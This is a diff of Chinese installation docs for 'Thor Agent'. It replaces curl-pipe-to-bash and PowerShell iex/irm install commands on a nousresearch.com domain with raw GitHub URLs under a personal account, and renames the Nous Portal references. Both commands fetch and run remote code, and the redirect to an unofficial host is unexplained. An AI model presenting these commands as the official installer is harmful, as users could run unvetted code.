@@ -15,7 +15,7 @@ description: "在 Linux、macOS、WSL2 或原生 Windows 上安装 Thor Agent"
 基于 git 的安装方式，跟踪 `main` 分支，可立即获取最新变更：
 
 ```bash
-curl -fsSL https://thor-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | bash
 ```
 
 ### Windows（原生，PowerShell）
@@ -25,7 +25,7 @@ curl -fsSL https://thor-agent.nousresearch.com/install.sh | bash
 打开 PowerShell 并运行：
 
 ```powershell
-iex (irm https://thor-agent.nousresearch.com/install.ps1)
+iex (irm https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.ps1)
 ```
 
 源码安装脚本克隆仓库，再由 PM 准备 Python 3.14、Node.js、npm、pnpm、ripgrep、FFmpeg 和 Python 依赖。
@@ -83,14 +83,14 @@ thor config set     # 设置单个配置项
 thor setup          # 或运行完整的设置向导一次性配置所有内容
 ```
 
-:::tip 最快路径：Nous Portal
+:::tip 最快路径：Thor Portal
 一个订阅涵盖 300+ 个模型以及 [Tool Gateway](../user-guide/features/tool-gateway.md)（网络搜索、图像生成、TTS、云端浏览器）。无需逐一管理各工具的密钥：
 
 ```bash
 thor setup --portal
 ```
 
-该命令一次性完成登录、设置 Nous 为提供商并开启 Tool Gateway。
+该命令一次性完成登录、设置 Thor 为提供商并开启 Tool Gateway。
 :::
 
 ---
